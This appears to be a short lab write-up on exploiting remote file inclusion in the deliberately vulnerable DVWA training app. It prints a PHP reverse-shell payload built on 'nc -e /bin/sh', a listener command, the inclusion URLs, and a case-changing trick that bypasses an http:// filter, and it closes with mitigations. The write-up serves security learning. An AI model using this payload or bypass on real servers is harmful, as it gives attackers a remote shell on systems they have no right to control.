---
layout: post
title: Dam Vulnerable Web App Remote File Inclusion
---

Exploiting the Dam Vulnerable Web App

# LOW
<?php
passthru("nc -e /bin/sh 10.0.2.15 8888"); 
?>

save as reverse.txt otherwise it will execute on your machine.

check that you can access it on your local machine.
service apache2 start

http://localhost/reverse.txt

nc -vv -l -p 8888

important to include http://

10.0.2.4/dvwa/vulnerabilities/fi/?page=http://10.0.2.15/reverse.txt

now we have reverse shell, possibly have to put ? on end of txt if it doesn’t work.

# MEDIUM

Doing the same steps as the easy one, we see that it doesn’t work.
But if we change the lowercase t’s to uppercase it bypasses it.
http://10.0.2.4/dvwa/vulnerabilities/fi/?page=hTTp://10.0.2.15/reverse.txt

Looking at the code 
    $file = str_replace("http://", "", $file);
    $file = str_replace("https://", "", $file); 
It is filtering out http:// and https:// .

# HIGH

High stops us from including any page but include.php .

# Ways of mitigating file inclusion

Prevent remove file inclusion
	Disable allow_url_fopen and allow_url_include
	
	Edit the files in /etc/php5/cgi/php.ini and set to off.

Prevent local file inclusion
	Use static file inclusion
